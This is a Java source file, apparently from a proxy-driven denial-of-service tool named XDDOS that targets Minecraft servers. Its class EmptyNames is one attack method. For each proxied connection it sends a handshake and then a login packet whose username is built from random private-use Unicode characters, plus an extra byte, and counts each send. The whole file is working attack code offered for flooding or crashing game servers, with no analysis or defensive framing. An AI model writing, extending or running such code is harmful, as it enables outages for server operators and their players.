package XD.XDDOS.methods;

import java.util.Random;

import XD.XDDOS.Main;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class EmptyNames 
implements Method{

    private byte[] handshakebytes = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2)).getWrappedPacket();
    String name = "";
    public Random rand = new Random();
    @Override
    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));

    for (int i = 0; i < 13; i++) {
      name = name + this.get();
    }
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(name)).getWrappedPacket()));
    channel.writeAndFlush(Unpooled.buffer().writeByte(1));
    NettyBootstrap.integer++;
  }
  public String get() {
    return this.rand.nextBoolean() ? "\ue000" : "\ue001";
}
}
    

